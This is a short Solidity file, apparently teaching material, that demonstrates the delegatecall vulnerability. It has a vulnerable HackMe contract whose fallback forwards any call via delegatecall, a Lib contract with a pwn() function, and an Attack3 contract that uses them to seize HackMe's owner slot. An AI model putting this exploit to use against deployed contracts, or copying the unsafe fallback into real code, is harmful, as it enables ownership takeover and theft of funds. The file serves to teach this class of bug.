// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

/**
 * @title Lib
 * @dev This contract is used to demonstrate the delegatecall vulnerability.
 */
contract Lib {
    address public owner;

    /**
     * @dev This function sets the owner of the contract to the caller of the function.
     */
    function pwn() public {
        owner = msg.sender;
    }
}

/**
 * @title HackMe
 * @dev This contract is used to demonstrate the delegatecall vulnerability.
 */
contract HackMe {
    address public owner;
    Lib public lib;

    /**
     * @dev This constructor sets the owner of the contract to the caller of the function and initializes the Lib contract.
     * @param _lib The address of the Lib contract.
     */
    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    /**
     * @dev This fallback function forwards all incoming calls to the Lib contract using delegatecall.
     */
    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

/**
 * @title Attack3
 * @dev This contract is used to demonstrate the delegatecall vulnerability.
 */
contract Attack3 {
    address public hackMe;

    /**
     * @dev This constructor sets the address of the HackMe contract.
     * @param _hackMe The address of the HackMe contract.
     */
    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    /**
     * @dev This function calls the pwn function of the Lib contract through the HackMe contract.
     */
    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
